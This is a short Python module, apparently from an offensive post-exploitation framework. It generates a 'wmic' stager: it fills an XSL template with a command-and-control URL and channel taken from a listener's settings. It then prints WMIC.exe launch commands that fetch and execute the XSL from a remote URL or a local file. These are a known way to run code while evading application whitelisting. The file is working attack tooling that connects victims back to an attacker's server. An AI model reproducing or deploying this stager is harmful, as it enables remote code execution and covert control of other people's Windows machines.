from core.utils import print_good, print_info


class STStager:
    def __init__(self):
        self.name = 'wmic'
        self.description = 'Stage via wmic XSL execution'
        self.author = '@byt3bl33d3r'
        self.options = {}

    def generate(self, listener, filename=None):
        stager_filename = 'wmic.xsl'
        if filename is not None:
            stager_filename = filename
        with open(stager_filename, 'w') as stager:
            with open('stagers/templates/wmic.xsl') as template:
                template = template.read()
                template = template.replace('C2_URL', f"https://{listener['BindIP']}:{listener['Port']}")
                template = template.replace('C2_CHANNEL', f"{listener.name}")
                stager.write(template)

                print_good(f"Generated stager to {stager.name}")
                print_info("Launch with:")
                print(f"\tC:\\Windows\\System32\\wbem\\WMIC.exe os get /format:\"https://myurl/{stager_filename}\"")
                print(f"\tC:\\Windows\\System32\\wbem\\WMIC.exe os get /format:\"{stager_filename}\"")
